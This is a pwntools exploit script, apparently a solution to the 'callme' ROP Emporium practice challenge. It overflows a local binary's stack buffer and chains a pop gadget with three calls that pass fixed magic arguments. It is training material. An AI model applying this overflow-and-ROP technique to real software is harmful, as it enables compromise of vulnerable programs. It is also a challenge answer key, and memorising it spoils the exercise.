from pwn import *
context.bits = 64
context.os = 'linux'
context.arch = 'amd64'

debug = False

p = process('./callme')

if debug:
    print("pid for process @ %d" % p.pid)
    pause()

arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)
args = arg1 + arg2 + arg3
junk = b'A' * 32 + b'B' * 8
one = p64(0x400720)
two = p64(0x400740)
three = p64(0x4006f0)
gadget = p64(0x40093c)
payload = junk + gadget + args + one
payload += gadget + args + two
payload += gadget + args + three
p.recvuntil(b'> ')
p.sendline(payload)
p.interactive()